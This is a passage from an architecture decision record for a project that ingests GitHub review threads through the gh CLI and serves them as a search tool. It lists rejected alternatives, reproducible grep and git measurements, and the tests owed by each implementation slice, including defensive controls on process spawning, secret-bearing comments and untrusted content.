| **Invent a new tool name for review-evidence search** | `review.search` has been published as planned in `docs/protocol/mcp-tools.md` since before this design. A tool name is a wire contract; adding an eighth name would leave a published one orphaned and make clients choose between them. |
| **Verify the serve slice against an external third-party public repository** | Its content can change or vanish under the assertions, so the harness's ground truth would be owned by someone else. A disposable fixture repository under this project's own org is frozen by construction. |
| **Ingest private repositories in v1, gated by the allowlist alone** | The allowlist decides *which* repository is contacted; it says nothing about whether the material is safe to serve. Private ingestion needs the `securityRelated` marking and the uniform serve refusal ADR-0029 specifies, and building that is a disclosure-class design in its own right — folding it into the first fetch path would ship the transport and the disclosure boundary in one review round. |

## Compliance

**This ADR ships no behaviour, so it has no shipped test to name.** Its
enforcement at design time is the measurements it cites; its enforcement at
implementation time is the tests the slices owe. The names below are the
properties an implementation must pin, not files that exist today — the same
honest split ADR-0029 states for the same reason.

Measured now, and reproducible from this ADR (2026-09-05, `origin/main` @
`1fe3302b`):

- The published `review.*` tool table has **7** rows, one shipped and six
  planned, which is why serving needs no new name:

  ```console
  $ grep -n '^| `review\.' docs/protocol/mcp-tools.md
  352:| `review.findings` | Shipped | Landed `Review-Finding:` trailers, filtered by reviewer, severity, commit or text |
  353:| `review.search` | Planned | Search review history |
  354:| `review.getThread` | Planned | One thread with comments and resolution |
  355:| `review.findSimilar` | Planned | Threads resembling a described situation |
  356:| `review.getDecisions` | Planned | Decisions reached in review |
  357:| `review.generateKnowledgeCandidate` | Planned write-intent | Emit a proposal; no approved-state write |
  358:| `review.listUnresolved` | Planned | Open threads |
  ```

- `ReviewResolution` has **no consumer outside its defining module**: two hits,
  both in `domain/review.py` (`git grep -n "ReviewResolution" --
  packages/theurian-core/src`).
- The core's runtime dependency list is **6** packages, none an HTTP client
  (`packages/theurian-core/pyproject.toml`).
- The fetch-absence prose population is **30** files under the wide phrase key
  printed in *Dispositions*, re-measured at slice-1 dispatch.
- The `providers.review.repositories` population is **15** files
  (`git grep -l 'providers\.review\.repositories' -- . ':!.claude' | wc -l`), a
  different set from the one above — which is why the allowlist reader is its own
  commit.
- The no-code scope of this change: `git diff origin/main...HEAD --stat` shows
  only paths under `docs/`, and
  `git diff origin/main...HEAD -- '*.py' '*.schema.json'` is empty.

Quoted, not re-run here (design consult, 2026-09-05, `gh` 2.86.0): runs A, B and
C; the `PullRequestReviewThread` field list; and the observation that
`http_unix_socket` is a configuration key on that version while `api_host` is not.
Slice 1 re-runs A, B and C as driving tests, which is the point at which they
become controls instead of quotations.

Owed at implementation, each tied to the slice that discharges it:

**Slice 1 — ingest**

- **Nine clause tests**, one per row of decision 1's table: the single spawn site
  (equality-pinned), the literal `graphql` endpoint with identity in variables,
  the `--hostname github.com` pin, the constructed `env={...}` allowlist with a
  negative test that a destination-bearing parent variable does not reach the
  child, the absolute binary path with `shell=False`, the absence of
  `--paginate`, the timeout and the two caps as named constants, the version
  floor's refusal, and the two graded refusal envelopes for absent and
  unauthenticated `gh`.
- **The allowlist is consulted before the spawn** — a synthetic-input test that a
  repository outside `providers.review.repositories` produces **no process
  spawn**, not a filtered result.
- **A private repository is refused at ingestion** — a synthetic-input test that
  nothing is written and the refusal carries a remedy.
- **`test_network_call_sites.py`'s absence claim is retired in the same commit
  that admits the site**, with the pinned set growing by exactly one and the file's
  own admission checklist satisfied clause by clause.
- **The T-7 entry is rewritten per control**, and the fetch-absence prose
  population moves in the same PR.
- **The domain-model break is recorded** — a CHANGELOG entry under `#### Changed`
  with a `BREAKING` marker naming the old shape and the new one, and a
  `BREAKING CHANGE:` trailer on the commit.

**Slice 2 — land**

- **A flagged record under `block` never becomes a file** — a test with a
  synthetic secret-bearing comment asserting that no file is written, that the
  report names the record and not the matched bytes, and that the run does not
  read as clean.
- **`warn` lands and reports; `off` scans nothing** — one test each.
- **Evidence files are the source** — a test that deleting the derived store and
  rebuilding from the files reproduces the served content, and that a record whose
  upstream has vanished survives a refetch.

**Slice 3 — serve**

- **Every body-derived field carries the SEC-15 triple** — a test on the
  `review.search` path asserting `contentClassification: untrusted-knowledge`,
  `mayContainInstructions: true`, `executable: false`, with a companion asserting
  that the check can fail.
- **The two-corpora equality** — one query against an index that held synthetic
  withheld rows and one that never did, asserting identical responses across every
  published field, count and member.
- **A ranked surface over review evidence ranks the T-17a-purged population**, if
  one is built — a filter does not clean FTS5 collection statistics.
- **The capability flag and its scope field** — a test that
  `system.capabilities` publishes `reviewIngestion: true` together with the
  public-allowlisted scope, and that the wire schema accepts both.
